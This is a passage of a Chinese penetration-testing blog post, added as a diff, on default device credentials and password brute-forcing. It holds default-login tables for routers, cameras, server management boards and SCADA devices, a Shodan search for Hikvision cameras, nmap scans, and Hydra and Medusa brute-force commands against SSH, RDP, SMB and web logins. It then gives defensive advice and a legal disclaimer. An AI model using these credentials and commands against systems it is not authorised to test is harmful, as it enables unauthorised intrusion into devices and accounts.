+<td>SSH&#x2F;HTTP</td>
+</tr>
+<tr>
+<td>MikroTik</td>
+<td>admin</td>
+<td>(空)</td>
+<td>WinBox&#x2F;SSH</td>
+</tr>
+<tr>
+<td>Huawei</td>
+<td>admin &#x2F; root</td>
+<td>admin &#x2F; Admin@huawei</td>
+<td>HTTP&#x2F;SSH</td>
+</tr>
+<tr>
+<td>Juniper</td>
+<td>root</td>
+<td>(空) &#x2F; juniper123</td>
+<td>SSH</td>
+</tr>
+<tr>
+<td>ZTE &#x2F; Tenda</td>
+<td>admin</td>
+<td>admin</td>
+<td>HTTP</td>
+</tr>
+<tr>
+<td>Netgear</td>
+<td>admin</td>
+<td>password &#x2F; admin</td>
+<td>HTTP</td>
+</tr>
+</tbody></table>
+<h3 id="网络摄像头-CCTV"><a href="#网络摄像头-CCTV" class="headerlink" title="网络摄像头 (CCTV)"></a>网络摄像头 (CCTV)</h3><p>安防摄像头因长期在线且固件更新滞后，默认凭证问题最为严重。Hikvision 和 Dahua 占据全球过半份额，<code>admin:12345</code> 组合在 Shodan 上至今极为常见。</p>
+<table>
+<thead>
+<tr>
+<th>厂商</th>
+<th>默认用户名</th>
+<th>默认密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Hikvision</td>
+<td>admin</td>
+<td>12345 &#x2F; admin12345</td>
+</tr>
+<tr>
+<td>Dahua</td>
+<td>admin</td>
+<td>admin</td>
+</tr>
+<tr>
+<td>Axis</td>
+<td>root</td>
+<td>pass &#x2F; admin</td>
+</tr>
+<tr>
+<td>Vivotek &#x2F; Foscam</td>
+<td>admin</td>
+<td>(空)</td>
+</tr>
+<tr>
+<td>Uniview</td>
+<td>admin</td>
+<td>123456</td>
+</tr>
+<tr>
+<td>Avigilon</td>
+<td>admin</td>
+<td>admin</td>
+</tr>
+</tbody></table>
+<p>使用 Shodan CLI 与 Nmap 脚本进行探测：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shodan search <span class="string">&#x27;Server: Hikvision-Webs country:CN&#x27;</span> \</span><br><span class="line">  --fields ip_str,port,org</span><br><span class="line">nmap -p 80,554,8000 --script http-default-accounts \</span><br><span class="line">  -iL camera_targets.txt -oA camera_scan</span><br></pre></td></tr></table></figure>
+
+<h3 id="IoT-与服务器管理"><a href="#IoT-与服务器管理" class="headerlink" title="IoT 与服务器管理"></a>IoT 与服务器管理</h3><table>
+<thead>
+<tr>
+<th>设备类型</th>
+<th>常见默认凭据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Dell iDRAC</td>
+<td>root:calvin</td>
+</tr>
+<tr>
+<td>HP iLO</td>
+<td>Administrator:admin 或随机 8 位</td>
+</tr>
+<tr>
+<td>Supermicro IPMI</td>
+<td>ADMIN:ADMIN</td>
+</tr>
+<tr>
+<td>QNAP &#x2F; Synology NAS</td>
+<td>admin:admin</td>
+</tr>
+<tr>
+<td>HP &#x2F; Ricoh &#x2F; Canon 打印机</td>
+<td>admin:(空) 或 admin:admin</td>
+</tr>
+<tr>
+<td>SCADA&#x2F;PLC</td>
+<td>厂商硬编码，如 Schneider: USER:USER</td>
+</tr>
+</tbody></table>
+<h3 id="打印机专项"><a href="#打印机专项" class="headerlink" title="打印机专项"></a>打印机专项</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PRET 工具测试打印机安全</span></span><br><span class="line">python pret.py 192.168.1.50 pjl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 ipmitool 验证 IPMI 默认凭据</span></span><br><span class="line">ipmitool -H 10.0.0.10 -U ADMIN -P ADMIN chassis status</span><br></pre></td></tr></table></figure>
+
+<h2 id="Hydra-实战"><a href="#Hydra-实战" class="headerlink" title="Hydra 实战"></a>Hydra 实战</h2><p><a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">Hydra</a> 是最经典的多协议在线爆破工具。</p>
+<h3 id="基础协议示例"><a href="#基础协议示例" class="headerlink" title="基础协议示例"></a>基础协议示例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SSH</span></span><br><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100</span><br><span class="line"></span><br><span class="line"><span class="comment"># FTP</span></span><br><span class="line">hydra -L users.txt -P passwords.txt ftp://192.168.1.100</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTP POST 表单</span></span><br><span class="line">hydra -l admin -P top1000.txt 192.168.1.100 http-post-form \</span><br><span class="line">  <span class="string">&quot;/login.php:user=^USER^&amp;pass=^PASS^:Login failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTP Basic Auth</span></span><br><span class="line">hydra -l admin -P top1000.txt http-get://192.168.1.100/admin</span><br></pre></td></tr></table></figure>
+
+<h3 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CSRF Token 动态提取</span></span><br><span class="line">hydra -l admin -P top1000.txt 192.168.1.100 http-post-form \</span><br><span class="line">  <span class="string">&quot;/login:user=^USER^&amp;pass=^PASS^&amp;csrf=^C^:Invalid:C=Set-Cookie: csrf_token=([^;]+)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RDP / MySQL / SMB</span></span><br><span class="line">hydra -l administrator -P passwords.txt rdp://192.168.1.100</span><br><span class="line">hydra -l root -P passwords.txt mysql://192.168.1.100</span><br><span class="line">hydra -l Administrator -P passwords.txt smb://192.168.1.100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量目标 + 找到即停</span></span><br><span class="line">hydra -L users.txt -P passwords.txt -M targets.txt ssh \</span><br><span class="line">  -t 4 -o results.txt -f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 断点续传</span></span><br><span class="line">hydra -R</span><br></pre></td></tr></table></figure>
+
+<h2 id="Medusa-实战"><a href="#Medusa-实战" class="headerlink" title="Medusa 实战"></a>Medusa 实战</h2><p><a target="_blank" rel="noopener" href="https://github.com/jmk-foofus/medusa">Medusa</a> 强调并行性和稳定性，适合大规模分布式爆破。</p>
+<h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SSH 爆破</span></span><br><span class="line">medusa -h 192.168.1.100 -u root -P /usr/share/wordlists/rockyou.txt -M ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定端口与线程</span></span><br><span class="line">medusa -h 192.168.1.100 -u admin -P top1000.txt -M ssh -n 2222 -t 10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户名密码组合文件</span></span><br><span class="line">medusa -h 192.168.1.100 -C combo.txt -M ssh</span><br></pre></td></tr></table></figure>
+
+<h3 id="HTTP-与批量"><a href="#HTTP-与批量" class="headerlink" title="HTTP 与批量"></a>HTTP 与批量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># HTTP POST 表单</span></span><br><span class="line">medusa -h 192.168.1.100 -u admin -P top1000.txt -M web-form \</span><br><span class="line">  -m FORM:<span class="string">&quot;path=/login.php&amp;user=USER&amp;pass=PASS&amp;submit=Login&quot;</span> \</span><br><span class="line">  -m DENY-SIGNAL:<span class="string">&quot;Login failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量目标</span></span><br><span class="line">medusa -H targets.txt -u admin -P passwords.txt -M ssh -t 4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有支持模块及参数</span></span><br><span class="line">medusa -d &amp;&amp; medusa -M ssh -q</span><br></pre></td></tr></table></figure>
+
+<h3 id="工具选择建议"><a href="#工具选择建议" class="headerlink" title="工具选择建议"></a>工具选择建议</h3><table>
+<thead>
+<tr>
+<th>场景</th>
+<th>推荐</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>简单快速单目标爆破</td>
+<td>Hydra</td>
+<td>语法简洁</td>
+</tr>
+<tr>
+<td>大规模分布式爆破</td>
+<td>Medusa</td>
+<td>并行模型更优</td>
+</tr>
+<tr>
+<td>HTTP 含 CSRF 的复杂表单</td>
+<td>Hydra</td>
+<td>内置 Token 提取引擎</td>
+</tr>
+<tr>
+<td>嵌入式设备资源受限环境</td>
+<td>Medusa</td>
+<td>内存占用更小</td>
+</tr>
+</tbody></table>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="技术措施"><a href="#技术措施" class="headerlink" title="技术措施"></a>技术措施</h3><ol>
+<li><strong>禁止默认凭据上线</strong> —— 强制首次启动修改密码。</li>
+<li><strong>启用多因素认证（MFA）</strong> —— 即使密码泄露仍可阻断未授权访问。</li>
+<li><strong>强密码策略</strong> —— 对接 <code>haveibeenpwned.com</code> API 过滤已知泄露密码。</li>
+<li><strong>智能锁定</strong> —— 渐进延迟 + CAPTCHA 替代简单 N 次失败锁定。</li>
+<li><strong>收敛攻击面</strong> —— 管理接口不外露公网，通过 VPN 或堡垒机访问。</li>
+<li><strong>日志 SIEM 告警</strong> —— 建立异常基线（如单 IP 跨多用户认证）。</li>
+</ol>
+<h3 id="针对供应链与资产"><a href="#针对供应链与资产" class="headerlink" title="针对供应链与资产"></a>针对供应链与资产</h3><ul>
+<li>供应商合同中写入交付前清除默认凭据条款。</li>
+<li>持续资产发现，扫描网络中新增或遗忘的 IoT 设备。</li>
+</ul>
+<h3 id="防御自查命令"><a href="#防御自查命令" class="headerlink" title="防御自查命令"></a>防御自查命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CrackMapExec 批量验证 SMB 弱口令</span></span><br><span class="line">crackmapexec smb 10.0.0.0/24 -u users.txt \</span><br><span class="line">  -p passwords.txt --continue-on-success</span><br><span class="line"></span><br><span class="line"><span class="comment"># BloodHound 发现特权路径</span></span><br><span class="line">bloodhound-python -d domain.local -u user \</span><br><span class="line">  -p pass -ns 10.0.0.10 -c All</span><br></pre></td></tr></table></figure>
+
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><blockquote>
+<p>本文所述技术仅限以下合法场景使用：</p>
+<ol>
+<li>对自有系统进行授权安全评估；</li>
+<li>获得客户书面授权的渗透测试项目；</li>
+<li>教育及学术研究目的。</li>
+</ol>
+<p><strong>任何未经授权对他人信息系统进行密码爆破、凭证测试或访问的行为均属违法</strong>，可能触犯《中华人民共和国刑法》第二百八十五条、第二百八十六条以及《中华人民共和国网络安全法》相关规定。读者须对自身行为负全部法律责任，作者不承担任何因误用本文信息导致的法律后果。</p>
+<p>在渗透测试中，建议在合同范围内明确约定认证测试的边界与协议，避免在生产高峰期执行大规模爆破。对云租户身份系统（Azure AD、Okta）的测试须事先取得平台方书面许可。</p>
+</blockquote>
+<h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/ihebski/DefaultCreds-cheat-sheet">DefaultCreds-cheat-sheet</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials">SecLists - Default Credentials</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">Hydra GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/jmk-foofus/medusa">Medusa GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/threat9/routersploit">RouterSploit</a></li>
+<li><a target="_blank" rel="noopener" href="https://cirt.net/passwords">CIRT.net Default Passwords</a></li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html">OWASP Credential Stuffing Prevention</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8/" rel="tag"># 认证安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Web-cache-poisoning/" rel="prev" title="Web缓存投毒攻击">
+                  <i class="fa fa-angle-left"></i> Web缓存投毒攻击
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Prototype-pollution/" rel="next" title="原型链污染攻击">
+                  原型链污染攻击 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
